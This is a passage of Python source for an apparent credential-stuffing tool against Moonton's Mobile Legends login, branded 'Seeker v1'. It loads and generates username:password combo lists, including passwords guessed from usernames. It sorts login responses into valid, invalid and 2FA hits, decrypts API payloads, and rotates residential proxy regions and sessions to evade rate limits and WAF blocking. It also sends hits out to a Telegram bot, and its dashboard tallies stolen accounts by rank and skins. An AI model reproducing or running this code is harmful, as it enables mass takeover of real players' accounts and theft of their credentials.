    p_out(top)
    for ln in lines:
        p_out(f"{indent}{_box_line(ln, w, bc)}")
    p_out(f"{indent}{c(bc)}{BBL}{BH * inner_w}{BBR}{W}")
    p_out("")

def render_dashboard(force: bool = False):
    global _LAST_RENDER
    if not _TUI_ACTIVE:
        return
    now_t = time.time()
    if not force and (now_t - _LAST_RENDER) < 0.2:
        return
    _LAST_RENDER = now_t

    term_cols, term_rows = shutil.get_terminal_size((80, 24))
    W_OUT = max(40, min(92, term_cols - 1))
    W_IN = W_OUT - 4
    BC = GRAY  # sleek slate/gray border matching HESU layout
    D_DIA, D_DOT, D_TRI, D_CDIA, D_SQ = ('◆', '●', '▸', '◇', '▬') if _UTF_OK else ('*', '*', '>', 'o', '=')

    el = int(max(now_t - stats['start'], 0))
    el_str = f"{el // 3600}:{(el % 3600) // 60:02d}:{el % 60:02d}"
    el_short = f"{el // 3600}h {el % 3600 // 60:02d}m" if el >= 3600 else f"{el // 60}m {el % 60:02d}s"
    ck, tot = stats['checked'], stats['total']
    rate = ck / max(now_t - stats['start'], 0.001)
    cpm = int(rate * 60)
    pct = (ck / tot * 100) if tot else 0.0
    rem = max(0, tot - ck)
    if rate > 0.05 and rem > 0:
        eta_s = int(rem / rate)
        eta_str = f"{eta_s // 3600}h {eta_s % 3600 // 60:02d}m" if eta_s >= 3600 else f"{eta_s // 60}m {eta_s % 60:02d}s"
    elif rem == 0 and tot > 0:
        eta_str = "0m 00s"
    else:
        eta_str = "--"

    st = stats['status']
    if st == 'RUNNING':
        _PERF.maybe_alert()
    is_drop, drop_tag, _, _, _, _ = _PERF.evaluate()
    uptime_str = f"{el // 3600:02d}:{(el % 3600) // 60:02d}:{el % 60:02d}"
    if st == 'WAF_WAIT':
        st_txt = f"{c(RED)}{D_DOT} WAF WAIT{W}"
    elif st == 'REFRESH':
        st_txt = f"{c(CYAN)}{D_DOT} REFRESH 1K{W}"
    elif st == 'DONE':
        st_txt = f"{c(GREEN)}{D_DOT} FINISHED{W}"
    elif is_drop:
        st_txt = f"{c(GOLD)}{D_DOT} DROP:{drop_tag}{W}"
    elif _PERF.smart_note and _PERF.smart_note != 'INIT':
        st_txt = f"{c(GREEN)}{D_DOT} {_PERF.smart_note[:16]}{W}"
    else:
        st_txt = f"{c(GREEN)}{D_DOT} ACTIVE{W}"

    w_live, w_tot = stats['workers'], stats.get('workers_total', stats['workers'])
    streams = w_live * (2 if TWO_TAB else 1)
    q_str = _fmt_bytes(stats['bytes_used'])
    bw_kbps = stats['bytes_used'] / max(now_t - stats['start'], 1.0) / 1024.0
    bw_txt = f"{c(GOLD)}{q_str}{W} {c(GRAY)}({bw_kbps:.1f} KB/s){W}"
    mode_tag = f"{'2-Tab' if TWO_TAB else '1-Tab'} {'Proxy' if PROXY_ENABLED else 'VPN'}"

    out_lines = [f"{c(BC)}{BT}{BH * (W_OUT - 2)}{BTR}{W}"]

    # Header bar: ◆ Seeker v1 - @lil_voda     ● ACTIVE   01:00:00
    hdr_r = f"{st_txt}   {c(GRAY)}{uptime_str}{W}" if W_IN >= 48 else st_txt
    hdr_l = _pad(
        f"{c(WHITE)}{D_DIA} {BD}Seeker v1{W} {c(GRAY)}-{W} {c(CYAN)}{stats.get('engine_label', '@lil_voda')}{W}",
        max(1, W_IN - _vis_len(hdr_r)),
    )
    out_lines.append(_box_line(f"{hdr_l}{hdr_r}", W_OUT, BC))

    # Top 5-column KPI strip on spacious terminals (matching HESU header cards)
    v_rate_ck = (stats['valid'] / ck * 100) if ck else 0.0
    o_rate_ck = (stats['otp'] / ck * 100) if ck else 0.0
    if W_OUT >= 74 and term_rows >= 29:
        kw = W_IN - 2
        col_w = (kw - 4) // 5
        rem_pad = kw - (col_w * 5 + 4)
        sep = f"{c(GRAY)}{BV}{W}"
        def _kpi_row(vals):
            cells = []
            for idx, (val, col) in enumerate(vals):
                cw = col_w + (rem_pad if idx == 4 else 0)
                val = _clip_ansi(val, cw)
                vis = _vis_len(val)
                lp = max(0, (cw - vis) // 2)
                cells.append(f"{c(col)}{' ' * lp}{val}{' ' * max(0, cw - vis - lp)}{W}")
            return _box_line(f"{c(GRAY)}{BV}{W}{sep.join(cells)}{c(GRAY)}{BV}{W}", W_OUT, BC)

        out_lines.append(_box_line(f"{c(GRAY)}{ST}{BH * kw}{STR}{W}", W_OUT, BC))
        out_lines.append(_kpi_row([
            (f"{BD}{ck:,}", WHITE),
            (f"{BD}{stats['valid']:,}", GREEN),
            (f"{BD}{stats['otp']:,}", GOLD),
            (f"{BD}{rate:.1f}/s", WHITE),
            (f"{BD}{w_live}/{w_tot}", WHITE),
        ]))
        out_lines.append(_kpi_row([
            ("PROCESSED", GRAY), ("VALID", GRAY), ("2FA / OTP", GRAY), ("RATE", GRAY), ("WORKERS", GRAY),
        ]))
        out_lines.append(_kpi_row([
            (f"of {tot:,}", GRAY),
            (f"{v_rate_ck:.1f}%", GOLD),
            (f"{o_rate_ck:.1f}% of chk", GRAY),
            (f"ETA {eta_str}", CYAN),
            (mode_tag, GRAY),
        ]))
        out_lines.append(_box_line(f"{c(GRAY)}{SBL}{BH * kw}{SBR}{W}", W_OUT, BC))

    # Full-width Progress bar line: PROGRESS 72.1% ████████░░░░░ 768/1,065 ETA 1m 57s
    p_right = f" {c(WHITE)}{ck:,}/{tot:,}{W}" + (f"  {c(GRAY)}ETA{W} {c(CYAN)}{eta_str}{W}" if W_OUT >= 62 else "")
    p_left = f"{c(GRAY)}PROGRESS{W} {c(WHITE)}{BD}{pct:5.1f}%{W} " if W_OUT >= 52 else f"{c(GOLD)}{pct:5.1f}%{W} "
    bar_w = max(6, W_IN - _vis_len(p_left) - _vis_len(p_right))
    filled = int(pct / 100 * bar_w)
    pbar = f"{c(GREEN)}{BAR_F * filled}{c(GRAY)}{BAR_E * (bar_w - filled)}{W}"
    out_lines.append(_box_line(f"{p_left}{pbar}{p_right}", W_OUT, BC))

    # 2-Column Body when W_OUT >= 68 and term_rows >= 20
    if W_OUT >= 68 and term_rows >= 20:
        LW = max(32, min(42, (W_IN - 3) // 2))
        RW = W_IN - LW - 3
        sep_col = f" {c(GRAY)}{BV}{W} "

        def _row2(l_txt: str, r_txt: str):
            out_lines.append(_box_line(f"{_pad(l_txt, LW)}{sep_col}{_pad(r_txt, RW)}", W_OUT, BC))

        def _div2():
            out_lines.append(_box_line(f"{c(GRAY)}{BH * LW} {BV} {BH * RW}{W}", W_OUT, BC))

        _div2()
        _row2(f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}ACCOUNT RESULTS{W}", f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}SYSTEM{W}")
        i_pct = (stats['invalid'] / ck * 100) if ck else 0.0
        e_pct = (stats['error'] / ck * 100) if ck else 0.0
        px_short = stats['proxy_label'][:max(8, RW - 14)]

        top_pairs = [
            (f" {c(GREEN)}{D_TRI} Valid{W}",     f"{c(GREEN)}{stats['valid']:>5,}{W}  {c(GRAY)}({v_rate_ck:4.1f}%){W}",
             f" {c(CYAN)}{D_CDIA} Workers{W}",  f"{c(CYAN)}{w_live}/{w_tot}{W} {c(GRAY)}({streams} st){W}"),
            (f" {c(RED)}{D_TRI} Invalid{W}",     f"{c(RED)}{stats['invalid']:>5,}{W}  {c(GRAY)}({i_pct:4.1f}%){W}",
             f" {c(CYAN)}{D_DOT} Bandwith{W}",   bw_txt),
            (f" {c(GOLD)}{D_DIA} 2FA / OTP{W}",  f"{c(GOLD)}{stats['otp']:>5,}{W}  {c(GRAY)}({o_rate_ck:4.1f}%){W}",
             f" {c(GREEN)}{D_TRI} Speed{W}",    f"{c(GREEN)}{rate:.1f}/s{W}"),
            (f" {c(GRAY)}{D_CDIA} Error{W}",     f"{c(GRAY)}{stats['error']:>5,}{W}  {c(GRAY)}({e_pct:4.1f}%){W}",
             f" {c(GOLD)}{D_DIA} CPM{W}",       f"{c(GOLD)}{cpm:,}{W}"),
            (f" {c(PURPLE)}{D_DOT} WAF Hits{W}", f"{c(PURPLE)}{stats['waf']:>5,}{W}  {c(GRAY)}({stats['waf_solved']:,} ok){W}",
             f" {c(CYAN)}{D_CDIA} Elapsed{W}",  f"{c(WHITE)}{el_short}{W}"),
            (f" {c(CYAN)}o Contexts{W}",         f"{c(WHITE)}{stats['proxy_ctx']:>5,}{W}  {c(GOLD)}{q_str}{W}",
             f" {c(GRAY)}o Proxy{W}",           f"{c(CYAN)}{px_short}{W}"),
        ]
        # Reserve space if terminal height is tight (e.g. 80x24 shows 5 pairs cleanly)
        max_top = 6 if (term_rows - len(out_lines) - 10) >= 6 else 5
        for lk, lv, rk, rv in top_pairs[:max_top]:
            _row2(f"{_pad(lk, 14)}{lv}", f"{_pad(rk, 14)}{rv}")

        # Remaining rows for Bottom Left (TIERS & PEAKS + TOP HITS) and Bottom Right (LIVE FEED)
        avail_bot = term_rows - len(out_lines) - 2  # 1 divider + 1 bottom border
        if avail_bot >= 5:
            _div2()
            # Build Left Bottom rows dynamically to fit avail_bot
            rm, rl, re_, ro = stats['rank_mythic'], stats['rank_legend'], stats['rank_epic'], stats['rank_other']
            r_tot = max(1, rm + rl + re_ + ro)
            def _tier_bar(lbl, cnt, col):
                tp = cnt / r_tot * 100 if (rm + rl + re_ + ro) else 0.0
                bw = max(1, min(10, int(round(tp / 10.0)))) if cnt else 0
                return f" {c(col)}{lbl:<10}{W}{c(WHITE)}{cnt:>3}{W} {c(GRAY)}({tp:4.1f}%){W} {c(col)}{D_SQ * bw}{W}"

            l_rows = [f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}TIERS & PEAKS{W}"]
            l_rows.extend([
                _tier_bar("Mythic+", rm, GREEN),
                _tier_bar("Legend", rl, GOLD),
                _tier_bar("Epic", re_, PURPLE),
                _tier_bar("Other", ro, RED),
            ])
            if avail_bot >= 9:
                l_rows.extend([
                    f"{_pad(f' {c(GOLD)}{D_DIA} Peak Skins{W}', 17)}{c(GOLD)}{stats['peak_skins'] or 0}{W}",
                    f"{_pad(f' {c(GREEN)}{D_DIA} Peak Level{W}', 17)}{c(GREEN)}Lv {stats['peak_lvl'] or 0}{W}",
                    f"{_pad(f' {c(GRAY)}o WAF Solved{W}', 17)}{c(WHITE)}{stats['waf_solved']}/{stats['waf']}{W}",
                ])
            if avail_bot >= 11:
                l_rows.append(f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}TOP HITS{W}")
                hits_room = max(1, min(3, avail_bot - len(l_rows)))
                if not _TOP_HITS:
                    l_rows.append(f" {c(GRAY)}No valid hits yet{W}")
                else:
                    for h_ln in _TOP_HITS[:hits_room]:
                        l_rows.append(f" {h_ln}")

            l_rows = l_rows[:avail_bot]
            feed_cap = max(len(l_rows), min(avail_bot, max(5, len(_LIVE_LOGS) + 1)))
            feed_logs = list(_LIVE_LOGS)[-(feed_cap - 1):]
            r_rows = [f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}LIVE FEED{W}"] + feed_logs
            n_bot = max(len(l_rows), len(r_rows))
            n_bot = min(avail_bot, n_bot)
            for idx_b in range(n_bot):
                lt = l_rows[idx_b] if idx_b < len(l_rows) else ""
                rt = r_rows[idx_b] if idx_b < len(r_rows) else ""
                _row2(lt, rt)
    else:
        # Compact single-column fallback for narrow/short terminals (<68w or <20h)
        out_lines.append(_box_line(
            f"{c(GREEN)}OK:{stats['valid']}{W} {c(RED)}INV:{stats['invalid']}{W} "
            f"{c(GOLD)}2FA:{stats['otp']}{W} {c(GRAY)}ERR:{stats['error']}{W} {c(CYAN)}{rate:.1f}/s{W}",
            W_OUT, BC,
        ))
        out_lines.append(_box_line(
            f"{c(GOLD)}MYT:{stats['rank_mythic']}{W} {c(PURPLE)}WAF:{stats['waf_solved']}/{stats['waf']}{W} "
            f"{c(CYAN)}CTX:{stats['proxy_ctx']}{W} {c(GOLD)}{q_str}{W}",
            W_OUT, BC,
        ))
        avail_c = term_rows - len(out_lines) - 1
        if avail_c >= 3 and _TOP_HITS:
            out_lines.append(_box_line(f"{c(GOLD)}HIT:{W} {_TOP_HITS[0]}", W_OUT, BC))
            avail_c -= 1
        if avail_c >= 3:
            out_lines.append(_box_line(f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}LIVE FEED{W}", W_OUT, BC))
            avail_c -= 1
            for entry in list(_LIVE_LOGS)[-min(3, avail_c):]:
                out_lines.append(_box_line(entry, W_OUT, BC))

    out_lines.append(f"{c(BC)}{BBL}{BH * (W_OUT - 2)}{BBR}{W}")
    # ponytail: hard height cap ensures frame never scrolls even on tiny terminals
    if len(out_lines) > term_rows:
        out_lines = out_lines[:max(2, term_rows - 1)] + [out_lines[-1]]

    out_buf = "\033[H" + "\n".join(ln + "\033[K" for ln in out_lines) + "\033[J"
    try:
        sys.stdout.write(out_buf)
        sys.stdout.flush()
    except Exception:
        pass

def print_progress():
    if not _TUI_ACTIVE:
        alert = _PERF.maybe_alert()
        if alert:
            p_out(f"  {c(GOLD)}[PERF] {alert}{W}")
    render_dashboard()

def _clean_tui(s) -> str:
    txt = _ANSI_RE.sub('', str(s or ''))
    return txt.replace('\r', ' ').replace('\n', ' ').replace('\t', ' ').strip()

def print_result(rtype, email, password, msg=""):
    idx = stats['checked']
    msg = _clean_tui(msg)
    email_c = _clean_tui(email)
    acc = email_c if len(email_c) <= 15 else (email_c[:12] + "...")
    if rtype == "INVALID":
        _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(RED)}{S_ERR}{W} {c(GRAY)}{_pad(acc, 15)}{W} {c(RED)}{msg[:18]}{W}")
    elif rtype == "OTP":
        _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GOLD)}{S_STAR}{W} {c(WHITE)}{_pad(acc, 15)}{W} {c(GOLD)}2FA {msg[:14]}{W}")
    elif rtype in ("ERR", "WAF", "ERROR"):
        _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GRAY)}!{W} {c(GRAY)}{_pad(acc, 15)}{W} {c(GRAY)}{(msg or 'Timeout')[:18]}{W}")
    if not _TUI_ACTIVE:
        p_out(f"  [{rtype}] {email_c}:{_clean_tui(password)} -> {msg}")
    else:
        render_dashboard()

def print_hit(email, password, d, info=None):
    idx = stats['checked']
    bi, gi, ci = {}, {}, {}
    if info and info.get('status') == 'success':
        bi = info.get('data', {}).get('basic_info', {})
        gi = info.get('data', {}).get('game_info', {})
        ci = info.get('data', {}).get('collector_info', {})

    rank = _clean_tui(gi.get('current_rank', '') or '')
    r_low = rank.lower()
    if 'mythic' in r_low: stats['rank_mythic'] += 1
    elif 'legend' in r_low: stats['rank_legend'] += 1
    elif 'epic' in r_low: stats['rank_epic'] += 1
    else: stats['rank_other'] += 1

    try:
        lvl = int(bi.get('level') or 0)
        if lvl > stats['peak_lvl']: stats['peak_lvl'] = lvl
    except (ValueError, TypeError):
        lvl = 0
    try:
        skins = int(bi.get('skin_count') or 0)
        if skins > stats['peak_skins']: stats['peak_skins'] = skins
    except (ValueError, TypeError):
        skins = 0

    pid, srv = _clean_tui(bi.get('player_id') or ''), _clean_tui(bi.get('server') or '')
    id_str = f"ID:{pid}({srv})" if pid and pid != 'Unknown' else ''
    tier_label = _clean_tui(ci.get('collector_tier', '') or 'VALID') or 'VALID'
    email_c = _clean_tui(email)
    acc = email_c if len(email_c) <= 15 else (email_c[:12] + "...")
    detail = f"{id_str} {skins}Sk {rank or ''}".strip() if id_str else (f"Lv{lvl} {skins}Skins" if (lvl or skins) else tier_label)
    feed_det = f"{pid} {skins}Sk {rank or ''}".strip() if id_str else detail
    _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GREEN)}{S_OK}{W} {c(WHITE)}{_pad(acc, 15)}{W} {c(GOLD)}{feed_det[:18]}{W}")
    u_short = email_c if len(email_c) <= 14 else (email_c[:11] + "...")
    _TOP_HITS.insert(0, f"{c(CYAN)}Lv{lvl:<3}{W} {c(WHITE)}{_pad(u_short, 14)}{W} {c(GOLD)}{skins}Sk {(rank or tier_label)[:7]}{W}")
    del _TOP_HITS[5:]

    if not _TUI_ACTIVE:
        p_out(f"  [HIT] {email_c}:{_clean_tui(password)} ({detail})")
    else:
        render_dashboard(force=True)

# ── Cryptography & Payload Parsing (checker.js 1:1) ─────────────────────────
def decrypt_payload(b64_str: str) -> str:
    """Port 1:1 fungsi decryptPayload dari checker.js.
    
    Format ciphertext dari Moonton:
      - byte terakhir = jumlah padding yang ditambahkan (bukan PKCS7 standar,
        tapi skema custom: flag byte di-append setelah ciphertext)
      - body = raw[:-1] (ciphertext AES tanpa flag byte)
      - setelah decrypt: potong (16 - flag) % 16 byte dari belakang
    Guard: pastikan body merupakan kelipatan 16 sebelum decrypt.
    """
    try:
        if not b64_str:
            return ""
        raw = base64.b64decode(b64_str)
        if len(raw) < 2:
            return ""
        flag = raw[-1]           # byte terakhir = padding count hint
        if flag > 16:
            return ""
        body = raw[:-1]          # sisa = ciphertext murni
        # Ciphertext AES-CBC harus kelipatan 16
        if len(body) == 0 or len(body) % 16 != 0:
            dbg(f"decrypt_payload: bad body length {len(body)}")
            return ""
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=b'\x00' * 16)
        pt = cipher.decrypt(body)
        # Hitung berapa byte hasil padding yang perlu dipotong
        pad_cut = (16 - flag) % 16
        n = len(pt) - pad_cut
        if n <= 0:
            dbg(f"decrypt_payload: pad_cut {pad_cut} >= plaintext len {len(pt)}")
            return ""
        return pt[:n].decode('utf-8', errors='ignore')
    except Exception as e:
        dbg(f"decrypt_payload error: {e}")
        return ""

def classify(j: dict | None) -> str:
    """Klasifikasi status response berdasarkan kode error Moonton."""
    if not j:
        return 'WAF'
    if j.get('__waf'):
        return 'WAF'
    
    code = j.get('code')
    msg  = str(j.get('message', ''))
    
    if code == 0 and not isinstance(code, bool):
        return 'VALID'
    # ponytail: 1004 & 1087 are invalid; avoid loose 'Email' in msg false positives
    if code in (1002, 1004, 1005, 1087) or re.search(r'PasswdError|LoginPwd_Fail|PwdError|wrong_pass|account.*not.*exist', msg, re.I):
        return 'INVALID'
    if code in (1086, 1065) or re.search(r'SendEmail|EmailCode|TwoFactor|VerifyEmail', msg, re.I):
        return 'OTP'
    if code in (1036, -2) or re.search(r'FailedTooMuch|TooMuch', msg, re.I):
        return 'RATE'
    return 'UNKNOWN'

# ── File Output & Telegram Alerts ───────────────────────────────────────────
def append_line(filename: str, line: str):
    try:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        path = os.path.join(OUTPUT_DIR, filename)
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except OSError as e:
        dbg(f"append_line({filename}) error: {e}")

def esc_html(s: str) -> str:
    return str(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

async def send_tg(text: str):
    if not TG_ON:
        return
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        payload = json.dumps({'chat_id': TG_CHAT, 'text': text, 'parse_mode': 'HTML'}).encode('utf-8')
        req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
        loop = asyncio.get_running_loop()
        def _post_tg():
            with urllib.request.urlopen(req, timeout=8) as r:
                r.read()
        _t0 = time.monotonic()
        await loop.run_in_executor(None, _post_tg)
        _PERF.record_stall('lookup', time.monotonic() - _t0)
    except Exception:
        pass

def _norm_combo_key(u: str, p: str) -> str:
    return f"{u.strip().lower()}:{p}"

def load_done() -> set[str]:
    """Resume: kumpulkan pasangan user:pass yang sudah selesai dari output files."""
    done = set()
    for fn in (FILES['VALID'], FILES['OTP'], FILES['INVALID']):
        fp = os.path.join(OUTPUT_DIR, fn)
        if os.path.exists(fp):
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            m_ts = re.search(r'\|\d{4}-\d{2}-\d{2}[T ]', line)
                            if m_ts:
                                prefix = line[:m_ts.start()]
                                if fn == FILES['VALID']:
                                    m_val = re.search(r'\|[A-Za-z0-9_-]{8,}\|\d+\|', prefix)
                                    if m_val:
                                        up = prefix[:m_val.start()].strip()
                                    else:
                                        up = prefix.rsplit('|', 3)[0].strip() if prefix.count('|') >= 3 else prefix.split('|', 1)[0].strip()
                                elif fn == FILES['OTP']:
                                    up = prefix.rsplit('|', 1)[0].strip()
                                else:
                                    up = prefix.strip()
                            else:
                                up = line.split('|', 1)[0].strip()
                            if ':' in up:
                                cu, cp = up.split(':', 1)
                                done.add(_norm_combo_key(cu, cp))
                            elif up:
                                done.add(up.lower())
            except Exception:
                pass
    return done

def load_combos(path: str) -> list[tuple[str, str]]:
    out = []
    seen = set()
    if not os.path.exists(path):
        p_out(f"{R}[!] File tidak ditemukan: {path}{W}")
        sys.exit(1)
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for ln in f:
            ln = ln.strip()
            if not ln or ln.startswith('#'):
                continue
            if ':' in ln:
                u, p = ln.split(':', 1)
                u, p = u.strip(), p.strip()
                if not u or not p:
                    continue
            else:
                continue
            k = _norm_combo_key(u, p)
            if k not in seen:
                seen.add(k)
                out.append((u, p))
    return out

# ── Multinational Names & Combo Generator (checker.js 1:1) ───────────────────
FALLBACK_NAMES = [
    'Yilmaz','Kaya','Demir','Celik','Sahin','Yildiz','Ozturk','Aydin','Ozdemir','Arslan',
    'Reyes','Santos','Cruz','Bautista','Garcia','Torres','Mendoza','Rivera','Flores','Gonzales',
    'Cahyo','Dinda','Gilang','Imam','Rinto','Sutarman','Wawan','Yayan','Putera','Hilman',
    'Sombat','Thawin','Saran','Tongdee','Noppadon','Suwimon','Praew','Teerayut','Natchaya','Supawadee',
    'Sokun','Veasna','Chantrea','Sothea','Roeun','Sambath','Visal','Dara','Koaung','Reaksmey',
    'Vuong','Thao','Viet','Binh','Truong','Duong','Luu','Tinh','Phung','Thien',
    'Ivanov','Smirnov','Kuznetsov','Popov','Sokolov','Lebedev','Kozlov','Morozov','Petrov','Volkov',
    'Rossi','Russo','Ferrari','Esposito','Bianchi','Romano','Colombo','Ricci','Marino','Moretti',
    'Silva','Souza','Oliveira','Pereira','Lima','Carvalho','Almeida','Ferreira','Rodrigues','Gomes',
    'Tyler','Steven','Gordon','Morgan','Bradley','Wallace','Harrison','Wilson','Douglas','Franklin',
    'Zulaikha','Maisarah','Saidatul','Rosnani','Noraini','Mastura','Zainal','Luqman','Azlan','Danial',
    'Aungsoe','Kyawzaw','Minkhant','Htutwin','Nandar','Zawwin','Shoon','Pwint','Thurakyaw','Minthu'
]

PREFIXES = ['the', 'The', 'its', 'Its', 'itss', 'real', 'mr', 'pro', 'king']
SUFFIXES = [
    '0','1','2','3','4','5','6','7','8','9','01','02','03','04','05','06','07','08','09','10',
    '11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30',
    '31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50',
    '100','123','143','321','404','420','515','520','666','777','888','999','1234','2020','2021',
    '2022','2023','2024','2025','2026','13579','24680','6969'
]

cached_names = None

def load_names() -> list[str]:
    global cached_names
    if cached_names:
        return cached_names
    candidates = [
        os.path.join(BASE, 'nama_10000.txt'),
        os.path.join(PROJECT_ROOT, 'Base', 'nama_10000.txt'),
        'nama_10000.txt'
    ]
    raw_list = []
    for p in candidates:
        if os.path.exists(p):
            try:
                with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        s = line.strip()
                        s = re.sub(r'[^a-zA-Z]', '', s)
                        if 2 <= len(s) <= 16:
                            raw_list.append(s[0].upper() + s[1:].lower())
                if len(raw_list) >= 500:
                    break
            except Exception:
                pass
    combined = list(dict.fromkeys(raw_list + FALLBACK_NAMES))
    cached_names = combined if combined else FALLBACK_NAMES
    return cached_names

def gen_pass(user: str) -> str:
    if not user:
        return user
    return user[0].upper() + user[1:].lower()

def random_username(names: list[str]) -> tuple[str, bool]:
    r_type = random.random()
    is_pfx = False
    if r_type < 0.78:
        user = random.choice(names) + random.choice(SUFFIXES)
    elif r_type < 0.88:
        is_pfx = True
        user = random.choice(PREFIXES) + random.choice(names)
        if random.random() < 0.3:
            user += random.choice(SUFFIXES)
    elif r_type < 0.94:
        n = random.choice(names)
        user = (n + n.lower()) if random.random() < 0.5 else (n + random.choice(names))
        if random.random() < 0.5:
            user += random.choice(SUFFIXES)
    else:
        user = random.choice(names) + str(random.randint(1, 999))

    r_case = random.random()
    if r_case < 0.15:
        user = user.upper()
    elif r_case < 0.35:
        user = user.lower()

    return user, is_pfx

def generate_combo(count: int) -> str:
    names = load_names()
    gen_dir = os.path.join(BASE, 'gen')
    os.makedirs(gen_dir, exist_ok=True)
    out_file = os.path.join(gen_dir, f"gen_{int(time.time()*1000)}.txt")
    seen = set()
    lines = []

    while len(lines) < count:
        user, is_pfx = random_username(names)
        key = user.lower()
        if key in seen:
            continue
        seen.add(key)
        pw = gen_pass(user)
        if is_pfx and random.random() < 0.35 and not pw.endswith('123'):
            pw += '123'
        elif random.random() < 0.06:
            pw += str(random.randint(10, 99))
        lines.append(f"{user}:{pw}")

    with open(out_file, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines) + '\n')
    p_out(f"{c(GREEN)}[*] Generated {len(lines):,} combo (dari {len(names)} pool nama) → {shortpath(out_file)}{W}")
    return out_file

# ── DataImpulse Proxy & Region Rotation (checker.js 1:1) ─────────────────────
# Urutan: region Asia-SEA dulu (paling stabil untuk MLBB), baru sisanya
# Jangan masukkan negara yang selalu ERR_TUNNEL (AF, AX, AL, DZ, AD, AI, AO, dll)
DATAIMPULSE_REGIONS = ['sg', 'my', 'id', 'jp', 'kr', 'hk', 'tw', 'th']
# Negara yang terbukti ERR_TUNNEL → di-skip saat rotasi
_TUNNEL_BLACKLIST = {
    'af','ax','al','dz','ad','ai','ao','aq','am','aw','az',
    'bs','bh','bd','bb','by','bz','bj','bt','bo','ba',
    'cf','td','km','cd','cg','ck','ci','cn','cu','cy',
    'dj','dm','er','et','fj','ga','gm','ge','gh','gn','gw','gy',
    'ht','hn','is','iq','ir','jm','jo','kz','ke','ki','kw','kg',
    'la','lb','ls','lr','ly','li','mg','mw','mv','ml','mh','mr','mu','mn','me','mz',
    'na','nr','np','ni','ne','ng','mk','om','pk','pw','ps','pa','pg','py','pe',
    'rw','ws','st','sa','sn','rs','sl','sb','so','ss','lk','sd','sr','sz',
    'sy','tj','tz','tl','tg','to','tt','tn','tm','ug','uy','uz',
    'vu','ve','ye','zm','zw'
}
region_counter = 0
session_counter = 0
cached_countries = None
# FIX: Lock diinisialisasi lazy di dalam event loop (bukan module-level) untuk
# kompatibilitas Python 3.9 ke bawah yang tidak boleh buat Lock di luar event loop.
_rotation_lock: asyncio.Lock | None = None

def _get_rotation_lock() -> asyncio.Lock:
    global _rotation_lock
    if _rotation_lock is None:
        _rotation_lock = asyncio.Lock()
    return _rotation_lock

def load_countries() -> list[dict]:
    candidates = [
        os.path.join(BASE, 'countries.json'),
        os.path.join(PROJECT_ROOT, 'Base', 'countries.json'),
        'countries.json'
    ]
    for p in candidates:
        if os.path.exists(p):
            try:
                with open(p, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                if isinstance(data, list) and data:
                    return data
            except Exception:
                pass
    return []

def get_countries_data():
    global cached_countries
    if cached_countries:
        return cached_countries
    raw = load_countries()
    c_map = {}
    codes = []
    for item in raw:
        code = item.get('code')
        if code:
            cd = code.lower()
            c_map[cd] = item.get('name') or cd.upper()
            codes.append(cd)
    cached_countries = {'map': c_map, 'codes': codes}
    return cached_countries

def parse_dataimpulse_user(user_str: str) -> tuple[str, list[str]]:
    if not user_str:
        return '', DATAIMPULSE_REGIONS
    parts = user_str.split('__')
    token = parts[0]
    regions = []
    for p in parts[1:]:
        if p.startswith('cr.'):
            regions = [s.strip().lower() for s in p[3:].split(',') if s.strip()]
    return token, (regions if regions else DATAIMPULSE_REGIONS)

def rotated_user(base_user: str, server: str = '', session_id: str = '') -> dict:
    """FIX: region_counter & session_counter diproteksi. Mendukung sticky session_id."""
    global region_counter, session_counter
    if not base_user:
        return {'user': '', 'region': 'DIRECT', 'countryName': 'Direct', 'session': ''}
    
    # KETAT: Rotasi username & negara HANYA untuk proxy DataImpulse (__cr. atau domain dataimpulse)
    is_dataimpulse = ('__cr.' in base_user) or ('dataimpulse' in str(server).lower())
    if not is_dataimpulse:
        return {
            'user': base_user,
            'region': 'PROXY',
            'countryName': 'Standard',
            'session': ''
        }

    sess = session_id if session_id else f"{int(time.time()*1000):x}{session_counter:x}"
    if not session_id:
        session_counter += 1
    
    c_data = get_countries_data()
    c_map, all_codes = c_data['map'], c_data['codes']
    token, regions = parse_dataimpulse_user(base_user)

    # Bangun pool: region dari username → DATAIMPULSE_REGIONS → all_codes, skip blacklist
    pool = (
        [r for r in regions if r not in _TUNNEL_BLACKLIST] +
        [r for r in DATAIMPULSE_REGIONS if r not in regions and r not in _TUNNEL_BLACKLIST] +
        [r for r in all_codes if r not in regions and r not in DATAIMPULSE_REGIONS and r not in _TUNNEL_BLACKLIST]
    )
    if not pool:
        pool = list(DATAIMPULSE_REGIONS) or ['sg', 'my']  # fallback tanpa menghapus _TUNNEL_BLACKLIST
    if session_id:
        explicit_regs = [r for r in regions if r not in _TUNNEL_BLACKLIST]
        fast_pool = explicit_regs or [r for r in DATAIMPULSE_REGIONS if r not in _TUNNEL_BLACKLIST] or pool
        idx = zlib.crc32(session_id.encode('utf-8')) % len(fast_pool)
        reg = fast_pool[idx]
    else:
        reg = pool[region_counter % len(pool)]
        region_counter += 1
    name = c_map.get(reg) or reg.upper()
    return {
        'user': f"{token}__cr.{reg}__s_{sess}",
        'region': reg.upper(),
        'countryName': name,
        'session': sess
    }

